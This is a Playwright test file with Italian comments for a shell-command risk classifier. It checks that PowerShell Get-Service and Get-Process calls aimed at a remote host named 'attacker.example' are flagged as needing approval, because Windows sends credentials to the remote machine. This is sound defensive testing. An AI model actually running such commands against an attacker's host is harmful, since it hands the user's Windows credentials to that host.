// #2292 giro 7 r2: Get-Service con un altro computer si collega a quel computer (e Windows gli manda le credenziali),
// ma resta una lettura libera; lo stesso con Get-Process chiede.
import { test, expect } from '@playwright/test';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const require = createRequire(import.meta.url);
const __dirname = dirname(fileURLToPath(import.meta.url));
const ROOT = join(__dirname, '..', '..', '..');
for (const f of ['constants.js', 'contenutoEsterno.js', 'capabilities.js', 'themeTokens.js', 'cmdClassify.js']) {
  require(join(ROOT, 'src', 'shared', f));
}
const C = globalThis.SN_CMD_CLASSIFY;
const PS = { cwd: 'C:\\Users\\Mario', home: 'C:\\Users\\Mario', win: true, maiuscole: true, shell: 'powershell' };

test('r2 una lettura che si collega a un altro computer chiede, come Get-Process sullo stesso computer', () => {
  expect(C.classify('Get-Process -ComputerName attacker.example', PS)).toBeGreaterThanOrEqual(2);
  for (const cmd of ['Get-Service -ComputerName attacker.example', 'Get-Service -cn attacker.example', 'Get-Service -Comp attacker.example']) {
    expect(C.classify(cmd, PS), cmd).toBeGreaterThanOrEqual(2);
  }
});
